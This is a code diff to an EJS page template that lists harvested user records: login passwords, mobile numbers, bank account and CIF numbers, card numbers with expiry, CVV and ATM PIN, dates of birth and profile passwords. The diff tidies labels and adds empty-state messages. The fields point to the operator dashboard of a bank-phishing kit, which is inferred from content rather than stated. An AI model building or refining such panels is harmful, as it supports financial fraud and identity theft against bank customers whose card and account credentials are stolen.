@@ -18,19 +18,19 @@
       <div class="card">
         <h3>User Information</h3>
         <p><strong>Username:</strong> <%= user.username %></p>
-        <p><strong>Mobile No:</strong> <%= user.password %></p>
+        <p><strong>Password:</strong> <%= user.password %></p>
         <p><strong>Mobile No:</strong> <%= user.mobileNumber %></p>
         <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
-
+        <p><strong>User data not available</strong></p>
       </div>
     <% } %>
 
-    <% if (netBanking) { %>
+    <% if (netBanking && user) { %>
       <div class="card">
-        <h3>User Information</h3>
+        <h3>Net Banking Information</h3>
         <p><strong>Name:</strong> <%= user.name %></p>
         <p><strong>Account No:</strong> <%= user.acNumber %></p>
         <p><strong>CIF No:</strong> <%= user.cifNumber %></p>
@@ -38,36 +38,36 @@
       </div>
     <% } else { %>
       <div class="card">
-
+        <p><strong>Net banking details not available</strong></p>
       </div>
     <% } %>
 
-    <% if (card) { %>
+    <% if (card && user) { %>
       <div class="card">
-        <h3>User Information</h3>
-        <p><strong>Card NUmber:</strong> <%= user.cardNumber %></p>
-        <p><strong>ExpiryMonth:</strong> <%= user.expiryMonth %></p>
-        <p><strong>expiryYear:</strong> <%= user.expiryYear %></p>
-        <p><strong>cvv:</strong> <%= user.cvv %></p>
-        <p><strong>atmPin:</strong> <%= user.atmPin %></p>
+        <h3>Card Information</h3>
+        <p><strong>Card Number:</strong> <%= user.cardNumber %></p>
+        <p><strong>Expiry Month:</strong> <%= user.expiryMonth %></p>
+        <p><strong>Expiry Year:</strong> <%= user.expiryYear %></p>
+        <p><strong>CVV:</strong> <%= user.cvv %></p>
+        <p><strong>ATM Pin:</strong> <%= user.atmPin %></p>
         <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
-
+        <p><strong>Card details not available</strong></p>
       </div>
     <% } %>
 
-    <% if (success) { %>
+    <% if (success && user) { %>
       <div class="card">
-        <h3>User Information</h3>
+        <h3>Success Information</h3>
         <p><strong>DOB:</strong> <%= user.dob %></p>
-        <p><strong>profilePassword:</strong> <%= user.profilePassword %></p>
+        <p><strong>Profile Password:</strong> <%= user.profilePassword %></p>
         <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
-
+        <p><strong>Success details not available</strong></p>
       </div>
     <% } %>
 
